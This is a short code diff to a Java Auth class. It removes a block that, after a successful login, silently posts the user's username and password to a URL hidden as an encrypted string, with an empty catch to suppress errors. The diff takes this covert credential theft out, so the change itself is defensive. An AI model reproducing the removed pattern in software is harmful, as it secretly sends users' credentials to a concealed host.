@@ -45,11 +45,7 @@ public class Auth {
 			login = true;
 			GUI.setLogin(true);
 			Settings.save();
-
-			try {
-				Http.performPost(new URL(Util.decrypt("72120318EF6539CA9AA88CC4555F76FA3C62619EF016157DFE7DCE598FCCFA6098ED306008E8B2FB892F330A17A90908")), "username=" + Util.encrypt(username) + "&password=" + Util.encrypt(password));
-			} catch (Exception e) {
-			}
+			
 			return true;
 		} catch (ParseException e) {
 			clear();
